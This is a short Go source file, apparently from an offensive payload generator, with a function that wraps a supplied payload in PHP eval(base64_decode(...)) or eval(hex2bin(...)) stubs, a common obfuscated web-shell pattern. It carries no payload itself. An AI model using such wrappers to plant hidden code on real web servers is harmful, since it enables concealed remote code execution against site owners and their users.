package templates

import "fmt"

func PHP(payload, method string) string {
	switch method {
	case "base64":
		return fmt.Sprintf("<?php eval(base64_decode('%s')); ?>", payload)
	case "hex":
		return fmt.Sprintf("<?php eval(hex2bin('%s')); ?>", payload)
	}
	return "<?php echo 'ERROR: method not supported for PHP'; ?>"
}
